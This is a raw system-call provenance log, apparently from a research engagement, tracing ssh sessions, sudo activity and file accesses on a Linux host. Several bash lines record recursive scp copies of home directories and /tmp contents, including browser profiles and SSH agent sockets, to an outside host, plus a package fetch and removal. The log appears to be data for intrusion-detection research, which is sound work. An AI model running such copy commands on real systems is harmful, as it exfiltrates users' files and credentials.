1557747431.109:1537533195,BD21F765-0EE9-F110-2AA2-68A40ECEFAB7:sudo,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557747431.109:1537533192,BD21F765-0EE9-F110-2AA2-68A40ECEFAB7:sudo,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747431.005:1537532749,1C1CD81A-6E9D-BDF5-DEF3-5674AF18B57F:sudo,CHANGE_PRINCIPAL,BD21F765-0EE9-F110-2AA2-68A40ECEFAB7,sudo,ta1-trace-2
1557747431.005:1537532738,73C7ED8D-9381-43F0-14CB-B24DD594D142:sudo,CHANGE_PRINCIPAL,1C1CD81A-6E9D-BDF5-DEF3-5674AF18B57F,sudo,ta1-trace-2
1557747431.005:1537532731,73C7ED8D-9381-43F0-14CB-B24DD594D142:sudo,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557747431.005:1537532730,73C7ED8D-9381-43F0-14CB-B24DD594D142:sudo,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557747431.005:1537532714,73C7ED8D-9381-43F0-14CB-B24DD594D142:sudo,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747431.005:1537532708,423AED2F-9ACA-E009-2866-505CB8A43074:sudo,CHANGE_PRINCIPAL,73C7ED8D-9381-43F0-14CB-B24DD594D142,sudo,ta1-trace-2
1557747431.005:1537532704,73C7ED8D-9381-43F0-14CB-B24DD594D142:sudo,CHANGE_PRINCIPAL,423AED2F-9ACA-E009-2866-505CB8A43074,sudo,ta1-trace-2
1557747431.005:1537532700,423AED2F-9ACA-E009-2866-505CB8A43074:sudo,CHANGE_PRINCIPAL,73C7ED8D-9381-43F0-14CB-B24DD594D142,sudo,ta1-trace-2
1557747431.005:1537532696,73C7ED8D-9381-43F0-14CB-B24DD594D142:sudo,CHANGE_PRINCIPAL,423AED2F-9ACA-E009-2866-505CB8A43074,sudo,ta1-trace-2
1557747431.005:1537532692,423AED2F-9ACA-E009-2866-505CB8A43074:sudo,CHANGE_PRINCIPAL,73C7ED8D-9381-43F0-14CB-B24DD594D142,sudo,ta1-trace-2
1557747431.005:1537532688,73C7ED8D-9381-43F0-14CB-B24DD594D142:sudo,CHANGE_PRINCIPAL,423AED2F-9ACA-E009-2866-505CB8A43074,sudo,ta1-trace-2
1557747431.005:1537532684,423AED2F-9ACA-E009-2866-505CB8A43074:sudo,CHANGE_PRINCIPAL,73C7ED8D-9381-43F0-14CB-B24DD594D142,sudo,ta1-trace-2
1557747431.005:1537532677,BD21F765-0EE9-F110-2AA2-68A40ECEFAB7:sudo,CHANGE_PRINCIPAL,423AED2F-9ACA-E009-2866-505CB8A43074,sudo,ta1-trace-2
1557747431.001:1537532662,BD21F765-0EE9-F110-2AA2-68A40ECEFAB7:sudo,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747431.001:1537532597,BD21F765-0EE9-F110-2AA2-68A40ECEFAB7:sudo,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747431.001:1537532477,4C75708E-0D1D-ACFA-ECF4-CDE167F65670:bash,EXECUTE,BD21F765-0EE9-F110-2AA2-68A40ECEFAB7,b'sudo dpkg -r xvnc4viewer',ta1-trace-2
1557747431.001:1537532477,75D0AC71-A544-8D86-203D-25665F4CBD47:bash,CHANGE_PRINCIPAL,4C75708E-0D1D-ACFA-ECF4-CDE167F65670,bash,ta1-trace-2
1557747431.001:1537532471,196778F5-8963-D4B6-F894-E3DB83DEE43E:bash,FORK,75D0AC71-A544-8D86-203D-25665F4CBD47,bash,ta1-trace-2
1557747430.341:1537530011,1E90E098-1D03-C33F-4EFF-B167039A70EA:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.341:1537530008,1E90E098-1D03-C33F-4EFF-B167039A70EA:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.341:1537530005,1E90E098-1D03-C33F-4EFF-B167039A70EA:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.341:1537530002,1E90E098-1D03-C33F-4EFF-B167039A70EA:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.341:1537529999,1E90E098-1D03-C33F-4EFF-B167039A70EA:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.341:1537529996,1E90E098-1D03-C33F-4EFF-B167039A70EA:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.341:1537529993,1E90E098-1D03-C33F-4EFF-B167039A70EA:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.341:1537529967,1E90E098-1D03-C33F-4EFF-B167039A70EA:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.337:1537529872,AE4EB70B-3F3F-0C6D-B5A4-A96230A6C160:scp,EXECUTE,1E90E098-1D03-C33F-4EFF-B167039A70EA,ssh,ta1-trace-2
1557747430.337:1537529862,1B2DCC2F-DC3E-FA82-F52B-94048C5103EA:scp,FORK,AE4EB70B-3F3F-0C6D-B5A4-A96230A6C160,scp,ta1-trace-2
1557747430.337:1537529855,1B2DCC2F-DC3E-FA82-F52B-94048C5103EA:scp,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.337:1537529794,CEEFF1CE-0B57-18E0-F181-E49F215B7C1F:bash,EXECUTE,1B2DCC2F-DC3E-FA82-F52B-94048C5103EA,b'scp user@128.55.12.122:./xvnc4viewer.deb .',ta1-trace-2
1557747430.337:1537529788,196778F5-8963-D4B6-F894-E3DB83DEE43E:bash,FORK,CEEFF1CE-0B57-18E0-F181-E49F215B7C1F,bash,ta1-trace-2
1557747430.153:1537526584,196778F5-8963-D4B6-F894-E3DB83DEE43E:bash,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.149:1537526498,9AF21026-FFA0-F12D-EB2C-FA9200525753:sshd,EXECUTE,196778F5-8963-D4B6-F894-E3DB83DEE43E,bash,ta1-trace-2
1557747430.149:1537526364,540EAC4C-65C6-39D4-93F8-80DEF4E650A1:sshd,FORK,9AF21026-FFA0-F12D-EB2C-FA9200525753,sshd,ta1-trace-2
1557747430.149:1537526318,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.149:1537526312,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.149:1537526288,0272DA67-313F-D3DF-4FDE-513A78D325FA:sshd,CHANGE_PRINCIPAL,540EAC4C-65C6-39D4-93F8-80DEF4E650A1,sshd,ta1-trace-2
1557747430.149:1537526266,D491FA3E-E3B2-B305-CD13-F590DCAC94EB:sshd,CHANGE_PRINCIPAL,0272DA67-313F-D3DF-4FDE-513A78D325FA,sshd,ta1-trace-2
1557747430.145:1537526263,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,FORK,D491FA3E-E3B2-B305-CD13-F590DCAC94EB,sshd,ta1-trace-2
1557747430.145:1537526254,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.145:1537526218,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.145:1537526215,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.145:1537526212,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.145:1537526136,8CE8C313-BCBB-AF37-C653-45E6EBE6DE70:update-motd-fsc,EXECUTE,928A62E7-F2CF-5F9A-544D-F1DF0CF8F552,cat,ta1-trace-2
1557747430.145:1537526134,D363196F-836A-72DD-B5E5-1F1D07BB72E6:update-motd-fsc,FORK,8CE8C313-BCBB-AF37-C653-45E6EBE6DE70,update-motd-fsc,ta1-trace-2
1557747430.141:1537525919,A2737A97-69C2-0B88-B80C-0A31F49E5F81:98-fsck-at-rebo,EXECUTE,D363196F-836A-72DD-B5E5-1F1D07BB72E6,update-motd-fsc,ta1-trace-2
1557747430.141:1537525897,2EDCD3BA-F4C3-67DB-4858-0693FF6DA27E:run-parts,EXECUTE,A2737A97-69C2-0B88-B80C-0A31F49E5F81,98-fsck-at-rebo,ta1-trace-2
1557747430.141:1537525896,B026BFAA-49E6-7ECB-E269-9E684B6192AB:run-parts,FORK,2EDCD3BA-F4C3-67DB-4858-0693FF6DA27E,run-parts,ta1-trace-2
1557747430.141:1537525847,D6D1F97D-E1EA-2D69-B83B-B3154603D080:update-motd-hwe,EXECUTE,4B44E16D-EE72-24C1-F15C-318B4F5542E4,cat,ta1-trace-2
1557747430.141:1537525845,41EA3149-2B39-C279-D10D-806801B95755:update-motd-hwe,FORK,D6D1F97D-E1EA-2D69-B83B-B3154603D080,update-motd-hwe,ta1-trace-2
1557747430.117:1537524442,736DAF97-0394-CF9E-2950-455FA51A2D3D:95-hwe-eol,EXECUTE,41EA3149-2B39-C279-D10D-806801B95755,update-motd-hwe,ta1-trace-2
1557747430.117:1537524421,EB154AA9-B400-5006-4D2B-BD604CC97894:run-parts,EXECUTE,736DAF97-0394-CF9E-2950-455FA51A2D3D,95-hwe-eol,ta1-trace-2
1557747430.117:1537524420,B026BFAA-49E6-7ECB-E269-9E684B6192AB:run-parts,FORK,EB154AA9-B400-5006-4D2B-BD604CC97894,run-parts,ta1-trace-2
1557747430.097:1537524038,C607DF64-BB3A-13D7-8603-57A170E7D7E4:lsb_release,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747430.085:1537523788,5C916BA7-ECD7-C12E-C334-475C25736566:91-release-upgr,EXECUTE,C607DF64-BB3A-13D7-8603-57A170E7D7E4,lsb_release,ta1-trace-2
1557747430.085:1537523779,670006E9-1B03-4F9D-5C90-89B74F4AE2C4:91-release-upgr,FORK,5C916BA7-ECD7-C12E-C334-475C25736566,91-release-upgr,ta1-trace-2
1557747430.085:1537523772,0E863897-D061-B64B-5F0B-A8C4F7538E02:91-release-upgr,FORK,670006E9-1B03-4F9D-5C90-89B74F4AE2C4,91-release-upgr,ta1-trace-2
1557747430.085:1537523750,3EBD9293-CA81-03E9-EC6B-00EBF728F935:run-parts,EXECUTE,0E863897-D061-B64B-5F0B-A8C4F7538E02,91-release-upgr,ta1-trace-2
1557747430.085:1537523749,B026BFAA-49E6-7ECB-E269-9E684B6192AB:run-parts,FORK,3EBD9293-CA81-03E9-EC6B-00EBF728F935,run-parts,ta1-trace-2
1557747430.085:1537523723,B3596E2B-54E2-625F-B8EC-0A913C23E3C9:update-motd-upd,EXECUTE,16CC9972-419C-F861-1126-8BDA0EB6D90A,cat,ta1-trace-2
1557747430.085:1537523721,A87087F2-6A9E-B004-EB6B-390E3AE43341:update-motd-upd,FORK,B3596E2B-54E2-625F-B8EC-0A913C23E3C9,update-motd-upd,ta1-trace-2
1557747430.061:1537522629,D2F81EFE-A34B-C5FA-D2BC-D60DA3F4221E:90-updates-avai,EXECUTE,A87087F2-6A9E-B004-EB6B-390E3AE43341,update-motd-upd,ta1-trace-2
1557747430.061:1537522608,EB4912CB-227B-8622-0F91-D611401574CE:run-parts,EXECUTE,D2F81EFE-A34B-C5FA-D2BC-D60DA3F4221E,90-updates-avai,ta1-trace-2
1557747430.061:1537522607,B026BFAA-49E6-7ECB-E269-9E684B6192AB:run-parts,FORK,EB4912CB-227B-8622-0F91-D611401574CE,run-parts,ta1-trace-2
1557747429.921:1537515347,140B0FAB-CC30-DA25-020B-64FA0C73A08D:landscape-sysin,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747429.913:1537514897,2A4BEC4B-BCA7-E9C9-F17F-0A9D6D56C96B:50-landscape-sy,EXECUTE,140B0FAB-CC30-DA25-020B-64FA0C73A08D,landscape-sysin,ta1-trace-2
1557747429.913:1537514893,AEB6D465-E997-B2F0-1EA9-143DE4BAEBD1:50-landscape-sy,FORK,2A4BEC4B-BCA7-E9C9-F17F-0A9D6D56C96B,50-landscape-sy,ta1-trace-2
1557747429.909:1537514618,BA7ED2E0-31CA-103F-7919-90396117793F:run-parts,EXECUTE,AEB6D465-E997-B2F0-1EA9-143DE4BAEBD1,50-landscape-sy,ta1-trace-2
1557747429.905:1537514582,B026BFAA-49E6-7ECB-E269-9E684B6192AB:run-parts,FORK,BA7ED2E0-31CA-103F-7919-90396117793F,run-parts,ta1-trace-2
1557747429.901:1537514226,5FF4022E-912F-8394-8C30-27CE69DD5E00:env,EXECUTE,B026BFAA-49E6-7ECB-E269-9E684B6192AB,run-parts,ta1-trace-2
1557747429.897:1537514192,AFE314D4-7CB6-BDB1-1370-ED6C873D7A20:sh,EXECUTE,5FF4022E-912F-8394-8C30-27CE69DD5E00,env,ta1-trace-2
1557747429.897:1537514185,3111B179-CD61-CE01-685E-D777C515BF30:sh,FORK,AFE314D4-7CB6-BDB1-1370-ED6C873D7A20,sh,ta1-trace-2
1557747429.897:1537514135,635EBE19-E5E9-FAD0-A5C7-73986895E112:sshd,EXECUTE,3111B179-CD61-CE01-685E-D777C515BF30,sh,ta1-trace-2
1557747429.897:1537514125,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,FORK,635EBE19-E5E9-FAD0-A5C7-73986895E112,sshd,ta1-trace-2
1557747429.897:1537514107,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747429.877:1537513717,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747429.877:1537513665,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747429.877:1537513653,7745FA69-266A-677E-D165-14E17C8DAED4:sshd,CHANGE_PRINCIPAL,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9,sshd,ta1-trace-2
1557747429.877:1537513652,0DCA3267-490A-E066-A7CF-81539C75CE7C:sshd,CHANGE_PRINCIPAL,7745FA69-266A-677E-D165-14E17C8DAED4,sshd,ta1-trace-2
1557747429.877:1537513651,7745FA69-266A-677E-D165-14E17C8DAED4:sshd,CHANGE_PRINCIPAL,0DCA3267-490A-E066-A7CF-81539C75CE7C,sshd,ta1-trace-2
1557747429.877:1537513650,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,CHANGE_PRINCIPAL,7745FA69-266A-677E-D165-14E17C8DAED4,sshd,ta1-trace-2
1557747429.877:1537513648,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747429.877:1537513634,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747429.877:1537513594,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557747429.877:1537513591,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747429.869:1537513542,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557747429.869:1537513539,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747429.765:1537513112,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747429.765:1537513060,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557747429.765:1537513059,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557747429.669:1537512649,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747429.661:1537512389,64078064-EF88-0FBD-FDE0-B375D7D6F127:sshd,EXECUTE,F844CB7A-2BE2-01CA-A2C4-6DB08F5DC7A9,sshd,ta1-trace-2
1557747429.661:1537512368,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,64078064-EF88-0FBD-FDE0-B375D7D6F127,sshd,ta1-trace-2
1557747309.508:1537240676,BD9C795D-EE4B-BDD3-B672-E7D8A2F70A2C:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747309.508:1537240629,BD9C795D-EE4B-BDD3-B672-E7D8A2F70A2C:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747309.504:1537240509,5D6F8AAB-01E0-A454-F64E-0BD9FB7C6A45:sshd,CHANGE_PRINCIPAL,BD9C795D-EE4B-BDD3-B672-E7D8A2F70A2C,sshd,ta1-trace-2
1557747309.504:1537240508,5D6F8AAB-01E0-A454-F64E-0BD9FB7C6A45:sshd,CHANGE_PRINCIPAL,5D6F8AAB-01E0-A454-F64E-0BD9FB7C6A45,sshd,ta1-trace-2
1557747309.504:1537240507,BD9C795D-EE4B-BDD3-B672-E7D8A2F70A2C:sshd,CHANGE_PRINCIPAL,5D6F8AAB-01E0-A454-F64E-0BD9FB7C6A45,sshd,ta1-trace-2
1557747308.160:1537234382,E6ADAF2D-C1E4-127E-7970-3C59AF30F6C5:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747308.160:1537234379,E6ADAF2D-C1E4-127E-7970-3C59AF30F6C5:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747308.160:1537234376,E6ADAF2D-C1E4-127E-7970-3C59AF30F6C5:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747308.160:1537234373,E6ADAF2D-C1E4-127E-7970-3C59AF30F6C5:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747308.160:1537234370,E6ADAF2D-C1E4-127E-7970-3C59AF30F6C5:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747308.160:1537234367,E6ADAF2D-C1E4-127E-7970-3C59AF30F6C5:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747308.160:1537234364,E6ADAF2D-C1E4-127E-7970-3C59AF30F6C5:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747308.156:1537234338,E6ADAF2D-C1E4-127E-7970-3C59AF30F6C5:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747308.156:1537234243,4281BC64-B133-153E-1DD4-F3B15341C70E:scp,EXECUTE,E6ADAF2D-C1E4-127E-7970-3C59AF30F6C5,ssh,ta1-trace-2
1557747308.156:1537234234,B8FE8A13-60F6-B682-DE34-66D918663CF3:scp,FORK,4281BC64-B133-153E-1DD4-F3B15341C70E,scp,ta1-trace-2
1557747308.156:1537234227,B8FE8A13-60F6-B682-DE34-66D918663CF3:scp,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747308.152:1537234166,27694DB4-30F4-8985-F93C-C4E19AE3116D:bash,EXECUTE,B8FE8A13-60F6-B682-DE34-66D918663CF3,b'scp -r /home/admin/backup /home/admin/corporales /home/admin/Desktop /home/admin/docs /home/admin/Documents /home/admin/Downloads /home/admin/files /home/admin/footstool /home/admin/gagtooth /home/admin/glx_alsa_675.ko /home/admin/grains /home/admin/hosts /home/admin/hsperfdata_darpa /home/admin/hyporhined /home/admin/ichthyodian /home/admin/insalivation /home/admin/jna-95354950 /home/admin/juliet /home/admin/knaps /home/admin/maremmese /home/admin/minion /home/admin/Music /home/admin/mytest /home/admin/nodeexporter /home/admin/out10 /home/admin/out20 /home/admin/out249 /home/admin/out250 /home/admin/out514 /home/admin/out559 /home/admin/out669 /home/admin/out724 /home/admin/out857 /home/admin/out864 /home/admin/out888 /home/admin/out892 /home/admin/out912 /home/admin/passwd /home/admin/Pictures /home/admin/Public /home/admin/Templates /home/admin/test /home/admin/Videos /home/admin/work /home/admin/xvnc4viewer.deb admin@128.55.12.106:./files/',ta1-trace-2
1557747308.152:1537234160,7FE10D61-92CA-EA04-E81C-847CC8BC175A:bash,FORK,27694DB4-30F4-8985-F93C-C4E19AE3116D,bash,ta1-trace-2
1557747303.804:1537221425,6BBF514B-25BB-A194-5BA8-181ECBC1D499:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.804:1537221422,6BBF514B-25BB-A194-5BA8-181ECBC1D499:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.804:1537221419,6BBF514B-25BB-A194-5BA8-181ECBC1D499:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.804:1537221416,6BBF514B-25BB-A194-5BA8-181ECBC1D499:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.804:1537221413,6BBF514B-25BB-A194-5BA8-181ECBC1D499:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.804:1537221410,6BBF514B-25BB-A194-5BA8-181ECBC1D499:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.804:1537221407,6BBF514B-25BB-A194-5BA8-181ECBC1D499:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.800:1537221385,6BBF514B-25BB-A194-5BA8-181ECBC1D499:ssh,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.796:1537221290,F70E1799-4A1A-846E-6E18-E8BCAC113D2B:scp,EXECUTE,6BBF514B-25BB-A194-5BA8-181ECBC1D499,ssh,ta1-trace-2
1557747303.796:1537221281,979520C5-AC9B-8DEB-4731-C6D2E31A171B:scp,FORK,F70E1799-4A1A-846E-6E18-E8BCAC113D2B,scp,ta1-trace-2
1557747303.796:1537221274,979520C5-AC9B-8DEB-4731-C6D2E31A171B:scp,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.796:1537221205,273A5643-6415-5996-F6EF-BB2189F8D6FA:bash,EXECUTE,979520C5-AC9B-8DEB-4731-C6D2E31A171B,b'scp -r /tmp/admiredly /tmp/betulinic /tmp/diglottism /tmp/dystonias /tmp/firefox_admin /tmp/firefox_root /tmp/grains /tmp/hsperfdata_darpa /tmp/kleptomanist /tmp/matrilinear /tmp/misy /tmp/mozilla_admin0 /tmp/MozillaMailnews /tmp/ssh-Q1Lt0fJdysyl /tmp/ssh-weL2TqO0XtQu /tmp/syconate /tmp/thetine admin@128.55.12.106:./work/',ta1-trace-2
1557747303.792:1537221187,7FE10D61-92CA-EA04-E81C-847CC8BC175A:bash,FORK,273A5643-6415-5996-F6EF-BB2189F8D6FA,bash,ta1-trace-2
1557747303.620:1537218007,7FE10D61-92CA-EA04-E81C-847CC8BC175A:bash,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.616:1537217924,AEF8DA46-50B9-5EA1-6CAA-4A3F77B1368B:sshd,EXECUTE,7FE10D61-92CA-EA04-E81C-847CC8BC175A,bash,ta1-trace-2
1557747303.616:1537217807,385701D0-0BAD-31C9-0C99-DFF40D255F42:sshd,FORK,AEF8DA46-50B9-5EA1-6CAA-4A3F77B1368B,sshd,ta1-trace-2
1557747303.616:1537217761,BD9C795D-EE4B-BDD3-B672-E7D8A2F70A2C:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.616:1537217755,BD9C795D-EE4B-BDD3-B672-E7D8A2F70A2C:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.616:1537217735,619BF3F6-9A60-E343-CB7C-5AA0C16190AE:sshd,CHANGE_PRINCIPAL,385701D0-0BAD-31C9-0C99-DFF40D255F42,sshd,ta1-trace-2
1557747303.616:1537217713,8476CECB-B4ED-5973-D218-A0487B5E8B82:sshd,CHANGE_PRINCIPAL,619BF3F6-9A60-E343-CB7C-5AA0C16190AE,sshd,ta1-trace-2
1557747303.616:1537217710,BD9C795D-EE4B-BDD3-B672-E7D8A2F70A2C:sshd,FORK,8476CECB-B4ED-5973-D218-A0487B5E8B82,sshd,ta1-trace-2
1557747303.616:1537217701,BD9C795D-EE4B-BDD3-B672-E7D8A2F70A2C:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.616:1537217665,BD9C795D-EE4B-BDD3-B672-E7D8A2F70A2C:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.616:1537217662,BD9C795D-EE4B-BDD3-B672-E7D8A2F70A2C:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.616:1537217659,BD9C795D-EE4B-BDD3-B672-E7D8A2F70A2C:sshd,MMAP,67037AF1-11B5-BC12-6061-5638D5601B97,/etc/passwd,ta1-trace-2
1557747303.612:1537217583,24348129-34D5-7DED-A93D-DC24BBF7CB26:update-motd-fsc,EXECUTE,777F7433-57DA-28CB-8095-115F4539F532,cat,ta1-trace-2
1557747303.612:1537217581,798B010E-C2B1-91CA-4B2A-BCAB83706FAB:update-motd-fsc,FORK,24348129-34D5-7DED-A93D-DC24BBF7CB26,update-motd-fsc,ta1-trace-2
